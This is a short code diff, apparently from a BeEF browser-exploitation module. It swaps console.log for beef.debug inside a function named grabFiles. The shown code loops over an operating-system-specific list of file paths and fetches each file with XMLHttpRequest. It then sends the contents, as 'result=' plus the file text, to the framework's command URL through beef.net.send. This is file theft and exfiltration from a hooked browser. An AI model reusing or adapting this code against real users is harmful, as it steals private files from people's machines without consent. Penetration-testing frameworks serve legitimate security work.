@@ -219,9 +219,9 @@ result = '';
     function grabFiles(dir,os){
 	    tmpfile = {}
 	    for (i in fileList[os]['post']){
-            console.log('dir = ' + dir);
-            console.log('fileList: ' + fileList[os]['post'][i]);
-		    console.log(i);
+            beef.debug('dir = ' + dir);
+            beef.debug('fileList: ' + fileList[os]['post'][i]);
+		    beef.debug(i);
 		    tmpfile[i] = new XMLHttpRequest()
 		    tmpfile[i].open ('get',dir+"/"+fileList[os]['post'][i]);
 		    tmpfile[i].send();
@@ -229,7 +229,7 @@ result = '';
 		    tmpfile[i].onreadystatechange=function(){
                 for (j in fileList[os]['post']){
 			        if(tmpfile[j].readyState==4){
-                        console.log('new returned for: ' + j);
+                        beef.debug('new returned for: ' + j);
                         result = j +": "+ tmpfile[j].responseText;
                         
                         beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result);
